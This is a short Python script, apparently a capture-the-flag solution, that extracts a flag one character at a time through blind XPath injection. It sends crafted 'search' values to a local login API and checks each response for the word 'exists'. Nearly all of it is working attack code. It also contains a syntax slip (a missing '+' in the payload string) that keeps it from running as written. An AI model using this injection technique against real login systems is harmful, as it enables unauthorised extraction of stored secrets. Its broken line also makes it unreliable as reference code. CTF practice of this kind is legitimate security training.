import requests
import string

flag = "CHTB{"
url = "http://127.0.0.1:1337/api/login"

#each time a successfull login is seen, restart a new loop
restart = True
count = len(flag) + 1

while restart:
	restart = False
	# Characters like *,&,. and + have to be avoided, cauz we using regex
	for char in "_" + string.ascii_lowercase + string.digits + "!#$%^()@{}":
		post_data = {"search": "'or subSring((/military/district[position()=2]/staff[position()=3]/setDestructCode)," + str(count) + ",1)=\"" + char"\" or ''=' "}
		r = requests.post(url, data=post_data, headers={'content-type': 'application/json'})
		print(post_data)
		#Correct char results in "successfull password
		if 'exists' in r.text:
			restart = True
			count += 1
			flag += char
			print(flag)
			#exit if "}" gives a valid redirect
			if char == "}":
				print("\nFlag: " + flag)
				exit(0)
			break